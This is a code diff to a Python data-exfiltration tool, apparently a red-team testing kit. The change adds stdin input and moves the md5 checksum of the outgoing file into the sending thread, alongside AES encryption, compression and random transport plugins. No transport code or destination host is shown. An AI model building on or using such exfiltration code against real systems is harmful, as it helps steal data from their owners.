@@ -15,6 +15,7 @@ from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
+from cStringIO import StringIO
 
 if getattr(sys, 'frozen', False):
     os.chdir(sys._MEIPASS)
@@ -92,11 +93,10 @@ def aes_decrypt(message, key=KEY):
         return None
 
 # Do a md5sum of the file
-def md5(fname):
+def md5(f):
     hash = hashlib.md5()
-    with open(fname) as f:
-        for chunk in iter(lambda: f.read(4096), ""):
-            hash.update(chunk)
+    for chunk in iter(lambda: f.read(4096), ""):
+        hash.update(chunk)
     return hash.hexdigest()
 
 
@@ -203,7 +203,7 @@ class Exfiltration(object):
         f = open(filename, 'w')
         f.write(content)
         f.close()
-        if (files[jobid]['checksum'] == md5(filename)):
+        if (files[jobid]['checksum'] == md5(open(filename))):
             ok("File %s recovered" % (fname))
         else:
             warning("File %s corrupt!" % (fname))
@@ -251,10 +251,22 @@ class ExfiltrateFile(threading.Thread):
         self.exfiltrate = exfiltrate
         self.jobid = ''.join(random.sample(
             string.ascii_letters + string.digits, 7))
-        self.checksum = md5(file_to_send)
+        self.checksum = '0'
         self.daemon = True
 
     def run(self):
+        # checksum
+        if self.file_to_send == 'stdin':
+            file_content = sys.stdin.read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        else:
+            file_content = open(self.file_to_send, 'rb').read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        self.checksum = md5(buf)
+        del file_content
+
         # registering packet
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
         ok("Using {0} as transport method".format(plugin_name))
@@ -270,7 +282,6 @@ class ExfiltrateFile(threading.Thread):
 
         # sending the data
         f = tempfile.SpooledTemporaryFile()
-        e = open(self.file_to_send, 'rb')
         data = e.read()
         if COMPRESSION:
             data = compress(data)
